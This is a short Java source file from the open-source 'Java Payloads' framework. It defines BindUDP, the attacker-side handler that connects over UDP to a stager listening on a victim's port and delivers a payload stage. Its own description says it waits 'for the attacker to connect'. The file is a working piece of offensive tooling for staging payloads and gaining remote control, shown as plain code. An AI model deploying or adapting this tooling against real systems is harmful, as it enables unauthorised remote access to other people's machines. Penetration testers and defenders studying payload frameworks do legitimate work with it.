/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.PrintStream;
import java.net.DatagramSocket;
import java.net.InetAddress;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

public class BindUDP extends StagerHandler {
	
	public BindUDP() {
		super("Bind on a UDP port", true, true, "Bind on a local UDP port and wait for the attacker to connect.");
	};
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("RHOST", false, Parameter.TYPE_HOST, "Remote host to connect to"),
				new Parameter("RPORT", false, Parameter.TYPE_PORT, "Remote port to connect to")
		};
	}
	
	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (readyHandler != null) readyHandler.notifyReady();
		ReverseUDP.handle(stageHandler, parameters, new DatagramSocket(), InetAddress.getByName(parameters[1]), Integer.parseInt(parameters[2]));
	}
	
	protected boolean needHandleBeforeStart() { return false; }
	
	protected String getTestArguments() {
		return "localhost 54321";
	}
}
